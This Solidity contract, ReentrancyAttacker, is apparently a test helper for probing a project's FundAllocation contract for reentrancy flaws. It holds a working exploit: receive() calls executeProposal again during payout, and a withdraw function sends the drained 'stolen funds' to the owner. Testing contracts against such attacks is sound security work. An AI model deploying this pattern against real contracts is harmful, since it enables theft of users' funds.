// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./FundAllocation.sol";
import "./ProposalManagement.sol";

/**
 * @title ReentrancyAttacker
 * @dev A malicious contract designed to test reentrancy vulnerabilities in the FundAllocation contract
 */
contract ReentrancyAttacker {
    FundAllocation public fundAllocation;
    ProposalManagement public proposalManagement;
    uint public proposalId;
    uint public attackCount;
    uint public maxAttacks;
    address public owner;
    bool public attacking;

    event AttackExecuted(uint count, uint balance);
    event FundsReceived(uint amount, uint balance);
    event AttackCompleted(uint totalStolen, uint finalBalance);

    constructor(address payable _fundAllocation, address _proposalManagement) {
        fundAllocation = FundAllocation(_fundAllocation);
        proposalManagement = ProposalManagement(_proposalManagement);
        owner = msg.sender;
        maxAttacks = 3; // Limit the number of reentrant calls to prevent out-of-gas errors
    }

    // Function to start the attack
    function setProposalId(uint _proposalId) public {
        require(msg.sender == owner, "Only owner can set proposal ID");
        proposalId = _proposalId;
    }

    function setMaxAttacks(uint _maxAttacks) public {
        require(msg.sender == owner, "Only owner can set max attacks");
        maxAttacks = _maxAttacks;
    }

    // Create a proposal with this contract as the recipient
    function createAttackProposal(string memory _description, uint _amount) public {
        require(msg.sender == owner, "Only owner can create attack proposal");
        proposalManagement.createProposal(_description, _amount, address(this));
    }

    // This is the function that will be called when the contract receives ETH
    receive() external payable {
        emit FundsReceived(msg.value, address(this).balance);

        // Only attempt reentrancy if we're not already attacking and haven't reached max attacks
        if (!attacking && attackCount < maxAttacks) {
            attacking = true;
            attackCount++;

            // Call back into the executeProposal function to exploit reentrancy
            try fundAllocation.executeProposal(proposalId) {
                emit AttackExecuted(attackCount, address(this).balance);
            } catch Error(string memory reason) {
                // Log the error if the attack fails
                emit AttackCompleted(address(this).balance, address(this).balance);
            }

            attacking = false;
        }
    }

    // Withdraw stolen funds to the owner
    function withdraw() public {
        require(msg.sender == owner, "Only owner can withdraw");
        uint amount = address(this).balance;
        (bool success, ) = owner.call{value: amount}("");
        require(success, "Withdrawal failed");
        emit AttackCompleted(amount, address(this).balance);
    }

    // Get the current balance of the contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
